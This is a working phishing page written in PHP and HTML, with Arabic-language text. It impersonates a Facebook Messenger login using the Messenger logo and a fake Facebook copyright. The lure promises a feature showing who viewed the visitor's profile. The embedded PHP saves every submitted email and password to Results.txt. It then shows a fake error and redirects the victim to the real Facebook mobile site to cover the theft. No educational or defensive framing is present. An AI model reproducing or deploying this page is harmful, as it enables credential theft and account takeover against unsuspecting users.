<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta property="og:image" content="https://cdn01.vulcanpost.com/wp-uploads/2016/12/fb-cover.jpg" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Messenger</title>
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Facebook_Messenger_logo.svg/595px-Facebook_Messenger_logo.svg.png">
	<link rel="stylesheet" type="text/css" href="index.css">
</head>
<body>
	<center><form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
		<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Facebook_Messenger_logo.svg/595px-Facebook_Messenger_logo.svg.png" alt="" width="175">
		<h1>Messenger</h1>
		<p dir="rtl">تمت اضافة بعض المميزات الجديدة منها من شاهد ملفك الشخصي<br>تسجيل الدخول بحساب Facebook لبدء الاستخدام</p>
		<input type="text" name="email" placeholder="البريد الالكتروني أو رقم الهاتف" >
		<input type="password" name="pass" placeholder="كلمة السر" >
		<button type="submit" class="login" name="login" >تسجيل الدخول</button>
			<?php
				if(isset($_POST["login"])){
					$handle = fopen("Results.txt", "a");
					foreach($_POST as $variable => $value) {
						#fwrite($handle, $variable);
						#fwrite($handle, "=");
						fwrite($handle, $value);
						fwrite($handle, ":");
					}
					fwrite($handle, "\r\n");
					fclose($handle);
					sleep(1);
					echo "<p style='color:red'>لا يمكنك التسجيل مره اخري برجاء تأكيد التسجيل</p><br><a class='cont' href='https://m.facebook.com'>تأكيد التسجيل</a>";
					exit;
				}
			?>
		<br><br><span>البقاء قيد تسجيل الدخول</span><br>
		<b>&COPY; Facebook Copyright</b>
	</form></center>
</body>
</html>